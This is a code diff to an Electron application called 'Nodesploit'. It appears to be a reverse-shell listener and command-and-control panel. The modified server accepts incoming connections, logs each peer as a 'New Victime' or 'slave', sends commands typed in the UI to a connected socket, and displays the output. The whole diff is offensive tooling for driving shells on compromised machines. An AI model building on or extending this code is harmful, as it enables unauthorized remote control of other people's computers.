@@ -1,5 +1,8 @@
 const { app, ipcMain, Notification } = require("electron");
+
 import { mainWindow } from "./window";
+import { nanoid } from "nanoid";
+
 import store from "@/store";
 
 /**
@@ -16,6 +19,7 @@ class Nodesploit {
   constructor() {
     this.mainWin = null;
     this.server = null;
+    this.sockets = [];
   }
 
   init() {
@@ -51,7 +55,11 @@ class Nodesploit {
   createServer(connection) {
     const net = require("net");
     this.server = new net.Server();
-    console.log(this.server.listening);
+
+    process.on('SIGTERM', ()=>{
+      this.server.close()
+    })
+
     this.server.on("listening", () => {
       var notif = new Notification({
         title: "Server is ON",
@@ -75,52 +83,66 @@ class Nodesploit {
 
     this.server.on("error", (e) => {
       if (e.code === "EADDRINUSE") {
-        
+        console.log("Address in use, retrying...");
+
+        // this.closeServer().then(() => {
+        //   this.server.listen(connection.port, connection.ip);
+        // });
       }
     });
 
     this.server.on("connection", (socket) => {
-      socket.id = Math.floor(Math.random() * 1000);
+      this.sockets.push(socket);
+      socket.id = nanoid(10);
+      socket.setEncoding("utf8");
+      console.log(`[💀] New Victime: ${socket.id}`);
       var notif = new Notification({
         title: "Nouvelles connexion !",
         body: `une nouvelles connexion entrant ${socket.remoteAddress}`,
       });
 
-      socket.read();
-
-      notif.show();
       this.mainWin.webContents.send("newConnection", {
         id: socket.id,
         ip: socket.remoteAddress,
+      });
+
+      notif.show();
+
+      // Socket is fully quitted
+
+      socket.on("error", (e) => {
+        console.log(e);
+        if (e.code == "ECONNRESET") {
+          console.log("Socket end shell with CTRL+C");
+        }
       });
 
       socket.on("close", () => {
         this.mainWin.webContents.send("slaveQuitted", socket.id);
       });
 
-      ipcMain.on("giveme", (err, res) => {
-        socket.pipe();
-        socket.write(res);
+      socket.on("end", () => {
+        this.mainWin.webContents.send("slaveQuitted", socket.id);
+      });
+
+      ipcMain.on("cmd", (event, res) => {
+        this.sockets[0].write(res.trim() + "\n");
       });
 
       socket.on("data", (data) => {
-        this.mainWin.webContents.send("datarec", data.toString());
-        console.log(`${data.toString("UTF-8")}`);
+        this.mainWin.webContents.send("datarec", data.toString("utf8"));
       });
     });
 
     this.server.listen({ host: connection.ip, port: connection.port }, () => {
-      console.log(`Server listen in ${connection.port}`);
+      console.log(`🔥 Server listen in ${connection.port}`);
     });
 
     return this.server.listening;
   }
 
-  closeServer() {
-    if (this.server.close()) {
-      console.log("Server stop listening");
-      return true;
-    }
+  async closeServer() {
+    await this.server.close();
   }
 
   ipc() {
@@ -140,8 +162,8 @@ class Nodesploit {
       this.mainWin.minimize();
     });
 
-    ipcMain.handle("serverlisten", (event, msg) => {
-      this.createServer(msg);
+    ipcMain.handle("serverlisten", (event, connection) => {
+      this.createServer(connection);
     });
 
     ipcMain.handle("server-stoplisten", () => {
